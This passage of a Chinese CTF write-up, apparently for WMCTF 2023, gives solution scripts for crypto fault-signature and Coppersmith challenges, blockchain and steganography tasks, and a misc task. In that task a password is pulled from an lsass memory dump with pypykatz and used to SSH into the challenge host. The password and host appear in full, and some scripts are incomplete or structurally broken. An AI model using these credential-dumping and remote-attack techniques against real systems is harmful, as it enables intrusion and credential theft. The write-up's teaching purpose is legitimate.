<p>$$b_i<em>s-r_i&#x3D;k_i</em>2^{16}\mod p\ b_i<em>s</em>2^{-16}-r_i*2^{-16}&#x3D;k_i\mod p$$</p>
<p>k是一个496bits，满足hnp</p>
<h2><span id="welcomesigner2">welcomesigner2</span><a href="#welcomesigner2" class="header-anchor"></a></h2><p>myfastexp的函数效果如下</p>
<p>$$先逆向处理d,根据参数j左右分成dl,dr.\ f(j)&#x3D;(m^{re(dl)} mod n)*(B_{l-j-1}^{re(dr)}\mod n_)\mod n_$$</p>
<p>其中B数组可以直接算出</p>
<p>从左往右，如果对应位数为0，那么上面式子的左半部分大小不变，以此来构建等式，逐位得到dr</p>
<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2023/8/19 18:04</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">msg = bytes_to_long(<span class="string">b&quot;Welcome_come_to_WMCTF&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    io=remote(<span class="string">&#x27;1.13.101.243&#x27;</span>,<span class="number">28412</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;|\t[Q]uit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;g&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;| n = &#x27;</span>)</span><br><span class="line">    n=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">    D=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    l=<span class="number">1023</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;flag_ciphertext = &#x27;</span>)</span><br><span class="line">    flag=io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;f&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;bytes, and index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2,2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;| [+] update: n_ -&gt; &quot;&#x27;</span>)</span><br><span class="line">    n_=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;&quot;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1023</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;|\t[Q]uit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;s&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Where your want to interfere:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27; is &#x27;</span>)</span><br><span class="line">    sig1=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">    t1=sig1*inverse(<span class="built_in">pow</span>(B[l-i-<span class="number">1</span>],<span class="number">2</span>*<span class="built_in">int</span>(D,<span class="number">2</span>),n_),n_) %n_</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;|\t[Q]uit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;s&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Where your want to interfere:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i+<span class="number">1</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27; is &#x27;</span>)</span><br><span class="line">    sig2=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">    t2=sig2*inverse(<span class="built_in">pow</span>(B[l-i-<span class="number">2</span>],<span class="number">4</span>*<span class="built_in">int</span>(D,<span class="number">2</span>),n_),n_) %n_</span><br><span class="line">    <span class="keyword">if</span> t1==t2:</span><br><span class="line">        D+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        D+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;111111111111111&#x27;</span> <span class="keyword">in</span> D:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(D)&gt;=<span class="number">1020</span>:</span><br><span class="line">    <span class="built_in">print</span>(D)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>得到密文和d来解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c=<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;2e8afbc4419284fb733a20c7e932feadae5deeb39f0e1d01c57c8109c08eb2020d48616c59d50d1a029a08b7673c9f71&#x27;</span>)</span><br><span class="line">c2=<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;329a89386fb65ccfd11a7c64349f1d45850a92e7f2e766da0fb07ddb64b0386ce11d7e7803fd4953023deeadf54ad7f7&#x27;</span>)</span><br><span class="line">key1=</span><br><span class="line">key2=</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(hashlib.md5(<span class="built_in">str</span>(key1).encode()).hexdigest())</span><br><span class="line">enc = AES.new(key,mode=AES.MODE_ECB)</span><br><span class="line">flag = enc.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(hashlib.md5(<span class="built_in">str</span>(key2).encode()).hexdigest())</span><br><span class="line">enc = AES.new(key,mode=AES.MODE_ECB)</span><br><span class="line">flag = enc.decrypt(c2)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2><span id="welcomesigner1">welcomesigner1</span><a href="#welcomesigner1" class="header-anchor"></a></h2><p>myfastexp的函数效果如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$先对d的二进制逆向，根据参数j左右分成dl,dr.\\ f(j)=((m^&#123;dl&#125; mod n) &lt;</span><br></pre></td></tr></table></figure>
<p>从左往右，如果对应位数为0，那么上面式子的右半部分大小不变，以此来构建等式，得到dl</p>
<p>exp参考上题，关键不同代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    temp=<span class="built_in">pow</span>(msg,<span class="built_in">int</span>(D,<span class="number">2</span>),n)</span><br><span class="line">    temp1=<span class="built_in">pow</span>(temp,<span class="number">2</span>**i,n_)</span><br><span class="line">    temp=<span class="built_in">pow</span>(msg,<span class="number">2</span>*<span class="built_in">int</span>(D,<span class="number">2</span>),n)</span><br><span class="line">    temp2=<span class="built_in">pow</span>(temp,<span class="number">2</span>**(i-<span class="number">1</span>),n_)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;|\t[Q]uit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;s&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Where your want to interfere:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27; is &#x27;</span>)</span><br><span class="line">    sig1=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">    t1=sig1*inverse(temp1,n_) %n_</span><br><span class="line">    <span class="comment"># print(sig1)</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;|\t[Q]uit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;s&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Where your want to interfere:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i-<span class="number">1</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27; is &#x27;</span>)</span><br><span class="line">    sig2=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">    t2=sig2*inverse(temp2,n_) %n_</span><br><span class="line">    <span class="keyword">if</span> t1==t2:</span><br><span class="line">        D+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        D+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;11111111111&#x27;</span> <span class="keyword">in</span> D:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(D)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(D)&gt;=<span class="number">1020</span>:</span><br><span class="line">    <span class="built_in">print</span>(D)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2><span id="badprime">badprime</span><a href="#badprime" class="header-anchor"></a></h2><p>简单的签到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">20825489698123139427312358235813908831188122629431837435213939197307901251678987909266109959310844471468714237308180487290333889068491106503430156516177566599988193609000565728122172493368572776286199729640176084529179529033159071165889815084949956152007234471933649343743634072356673587613258974082953565848240177717357720918379799092214471736935314356967352460495832597042553425146329955254971272296130376832214081900624023878189763660242551943370962708281677737787426223857022204965043738543727228525935167205033424509100484602367650848918269719924270083733713912562266880394295051276242510789648948740514338324777</span></span><br><span class="line">c=<span class="number">17660292517001448415667382933294147092092405515035599241974878300112871854442062464511060994610735354900137641722708614729686565533897576482184144279181475147778387677176348272271380462469442504169069741393441249336244403644195456048895432327953609790997136317418079743539554372864800226725666330693057526593982562626092666413078781481473963123259351557468951203872280649962451021987453492400869965374621346616866098360220974826366437663499045468100705032192923936739527164839478419438533067729191594895444595242468993294280095495595676751833319662172716427810323452481625334318690581815970642174149961644882435761028</span></span><br><span class="line">leak=<span class="number">3692928803159612385082176945507830185837247431720458675036856767821980549084041505438940558901970003265562780917014304168473747961208711410251658081541741851950617445754508576247765571585451448623373615544180432133708851940192670177786710978705748899533781421711820301844113328851132313516583</span></span><br><span class="line">M=<span class="number">0x7cda79f57f60a9b65478052f383ad7dadb714b4f4ac069997c7ff23d34d075fca08fdf20f95fbc5f0a981d65c3a3ee7ff74d769da52e948d6b0270dd736ef61fa99a54f80fb22091b055885dc22b9f17562778dfb2aeac87f51de339f71731d207c0af3244d35129feba028a48402247f4ba1d2b6d0755baff6</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f=x*M+leak</span><br><span class="line">f.monic().small_roots(X=<span class="number">2</span>^<span class="number">53</span>,beta=<span class="number">0.44</span>)</span><br><span class="line">p=<span class="number">6960192004016795</span>*M+leak</span><br><span class="line">q=n//p</span><br><span class="line"><span class="keyword">assert</span> p*q==n</span><br><span class="line">d=inverse(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">long_to_bytes(ZZ(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure>

<h1><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h1><h2><span id="oversharing">Oversharing</span><a href="#oversharing" class="header-anchor"></a></h2><p>pcap data 发现 smb sharing 的 lsass.dmp 文件</p>
<p>pypykatz 分析后得到明文密码和用户名</p>
<p>1a05cf83-e450-4fbf-a2a8-b9fd2bd37d4e</p>
<p>randark</p>
<p>ssh <a href="mailto:&#114;&#97;&#110;&#100;&#97;&#114;&#x6b;&#x40;&#49;&#x2e;&#x31;&#51;&#x2e;&#x31;&#48;&#x31;&#46;&#50;&#x34;&#x33;">randark@1.13.101.243</a> -p25771</p>
<p>链接上去后直接 cat flag 即可</p>
<h2><span id="findme">FindMe</span><a href="#findme" class="header-anchor"></a></h2><p>我的朋友WearyMeadow几天前在Reddit发了一条动态，他认为没有人能破解他的消息，真的吗？ My friend WearyMeadow posted a Reddit post a few days ago and he doesn’t think anyone can decrypt his message. Really?</p>
<p><a href="https://wearymeadow.icu/about/">https://wearymeadow.icu/about/</a></p>
<p>存在一个被加密的推文 根据生成时间判断相似 以及文章标题和 reddit 一致，密码是P@sSW0rD123$%^</p>
<p><a href="https://www.reddit.com/user/WearyMeadow/comments/15u7773/hello/">https://www.reddit.com/user/WearyMeadow/comments/15u7773/hello/</a> –&gt; aHR0cHM6Ly91ZmlsZS5pby82NzB1bnN6cA&#x3D;&#x3D; –&gt;</p>
<p><a href="https://ufile.io/670unszp">https://ufile.io/670unszp</a></p>
<p>解出来 message.pcap 文件 流量分析基本情况是 存在一个 tcp 聊天 并且 secretkey 是 mysecretkey (?)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">message, key, seed</span>):</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    encrypted_msg = message</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    decrypted_msg = cipher.decrypt(pad(encrypted_msg))</span><br><span class="line">    decrypted = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(decrypted_msg)):</span><br><span class="line">        decrypted += <span class="built_in">bytes</span>([decrypted_msg[i] ^ random.randint(<span class="number">0</span>, <span class="number">255</span>)])</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">encrypted_hex = <span class="string">&quot;778f6cc13090c6a4f0b51939d784a6b38512f80a92b82bf8225fb8bfed713b2f8eee53dfbe228c7296449d904467a1677c83b9534e2dfcfcbc6f7b08f77f96f2&quot;</span></span><br><span class="line">encrypted = long_to_bytes(<span class="built_in">int</span>(encrypted_hex, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(encrypted)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seed <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12345</span>):</span><br><span class="line">    decrypted_int = <span class="built_in">int</span>(decrypt(encrypted, pad(<span class="string">b&quot;mysecretkey&quot;</span>), seed).<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;CTF&#123;&#x27;</span> <span class="keyword">in</span> long_to_bytes(decrypted_int) <span class="keyword">or</span> <span class="string">b&#x27;ctf&#123;&#x27;</span> <span class="keyword">in</span> long_to_bytes(decrypted_int):</span><br><span class="line">        <span class="built_in">print</span>(seed, long_to_bytes(decrypted_int))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2><span id="fantastic-terminal">Fantastic_terminal</span><a href="#fantastic-terminal" class="header-anchor"></a></h2><p><img src="./20230821210707921.jpg" alt="img"></p>
<h1><span id="blockchain">Blockchain</span><a href="#blockchain" class="header-anchor"></a></h1><h2><span id="babyblock">babyblock</span><a href="#babyblock" class="header-anchor"></a></h2><p>签到题，根据合约creation交易找到timestamp即可。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ChallengeWM23</span>__factory, <span class="title class_">ChallengeWM23</span> &#125; <span class="keyword">from</span> <span class="string">&quot;../../typechain&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; log, initialize &#125; <span class="keyword">from</span> <span class="string">&quot;../utils&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> tx = <span class="string">&quot;0xcb2d1f40783046b623e39312267ad91ecf40ee338fb1631c2526c96af7f7e3b2&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> contractAddress = <span class="string">&quot;0xCe8B517e34f7b5C95Dfc16931fC0eC5E41796327&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> [challengeContract, attacker] = <span class="keyword">await</span> initialize&lt;<span class="title class_">ChallengeWM23</span>&gt;(<span class="title class_">ChallengeWM23</span>__factory, <span class="literal">undefined</span>, <span class="literal">undefined</span>, <span class="literal">undefined</span>, contractAddress);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> blockHash = (<span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getTransaction</span>(tx))?.<span class="property">blockHash</span>;</span><br><span class="line">    <span class="keyword">if</span> (blockHash) &#123;</span><br><span class="line">        <span class="keyword">let</span> block = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBlock</span>(blockHash);</span><br><span class="line">        <span class="keyword">let</span> timestamp = block?.<span class="property">timestamp</span>;</span><br><span class="line">        <span class="keyword">if</span> (timestamp) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="built_in">number</span> = timestamp % <span class="number">10</span> +<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">let</span> tx = <span class="keyword">await</span> challengeContract.<span class="title function_">guessNumber</span>(<span class="built_in">number</span>);</span><br><span class="line">            <span class="keyword">await</span> tx.<span class="title function_">wait</span>();</span><br><span class="line">            <span class="title function_">log</span>(<span class="string">`Is Solved: <span class="subst">$&#123;<span class="keyword">await</span> challengeContract.isSolved()&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>().<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">  process.<span class="property">exitCode</span> = <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1><span id="steg">Steg</span><a href="#steg" class="header-anchor"></a></h1><h2><span id="ez-v1deo">EZ_v1deo</span><a href="#ez-v1deo" class="header-anchor"></a></h2><p>使用windows的播放器没办法播放，可以使用其他播放器进行播放即可正常查看视频</p>
<p><img src="./20230821210711167.jpg" alt="img"></p>
<p>这里查看并无异常，然后尝试AVI隐写</p>
<p><img src="./20230821210711091.jpg" alt="img"></p>
<p>avi隐写可以讲信息隐藏在某一帧的图片中，使用ffmpeg转换出每一帧进行查看lsb</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i E:\BaiduNetdiskDownload\<span class="number">1</span>\flag.avi -r <span class="number">30</span> C:\Users\Ap_os\Desktop\<span class="number">2</span>-<span class="number">4</span>\image-%3d.png</span><br></pre></td></tr></table></figure>

<p><img src="./20230821210711409.jpg" alt="img"></p>
<p><img src="./20230821210711397.jpg" alt="img"></p>
<p>隐写查看</p>
<p><img src="./20230821210711450.jpg" alt="img"></p>
<p>得到w, 应该是WMCTF{},然后将每一帧都进行查看即可</p>
<p>得到字符串进行剔除重复的，然后使用比较多的相同字符即为flag中重复的字符，比如下面的9</p>
<p><img src="./20230821210711499.jpg" alt="img"></p>
<h2><span id="steglab1">StegLab1</span><a href="#steglab1" class="header-anchor"></a></h2><p>加密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self, img_path, key</span>):</span><br><span class="line">        key = <span class="string">&quot;1111&quot;</span></span><br><span class="line">        img = Image.<span class="built_in">open</span>(img_path)</span><br><span class="line">        img_array = np.array(img)</span><br><span class="line"></span><br><span class="line">        key_values = [<span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> key]</span><br><span class="line">        max_key_length = <span class="built_in">min</span>(<span class="built_in">len</span>(key_values), img_array.size)</span><br><span class="line"></span><br><span class="line">        flat_img_array = img_array.flatten()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_key_length):</span><br><span class="line">            flat_img_array[i] ^= key_values[i]</span><br><span class="line"></span><br><span class="line">        encrypted_img_array = flat_img_array.reshape(img_array.shape)</span><br><span class="line"></span><br><span class="line">        encrypted_img = Image.fromarray(encrypted_img_array.astype(np.uint8))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> encrypted_img</span><br></pre></td></tr></table></figure>

<p>写解密脚本跑出来这个加密的key，系统可以检测得应该就可以点击flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self, img, key</span>) :</span><br><span class="line">        img = Image.<span class="built_in">open</span>(img)</span><br><span class="line">        img_array = np.array(img)</span><br><span class="line"></span><br><span class="line">        key_bin = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> key)  <span class="comment"># Convert key to binary</span></span><br><span class="line"></span><br><span class="line">        key_index = <span class="number">0</span>  <span class="comment"># Track the index of the key bit we&#x27;re currently hiding</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img_array.shape[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img_array.shape[<span class="number">1</span>]):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(img_array.shape[<span class="number">2</span>]):</span><br><span class="line">                    <span class="keyword">if</span> key_index &lt; <span class="built_in">len</span>(key_bin):</span><br><span class="line">                        pixel_value = img_array[i, j, k]</span><br><span class="line">                        new_pixel_value = pixel_value &amp; <span class="number">0xFE</span> | <span class="built_in">int</span>(key_bin[key_index])</span><br><span class="line">                        img_array[i, j, k] = new_pixel_value</span><br><span class="line">                        key_index += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        encrypted_img = Image.fromarray(img_array)</span><br><span class="line">        <span class="keyword">return</span> encrypted_img</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">self,img</span>)-&gt; <span class="built_in">str</span>:</span><br><span class="line">        img = Image.<span class="built_in">open</span>(img)</span><br><span class="line">        img_array = np.array(img)</span><br><span class="line"></span><br><span 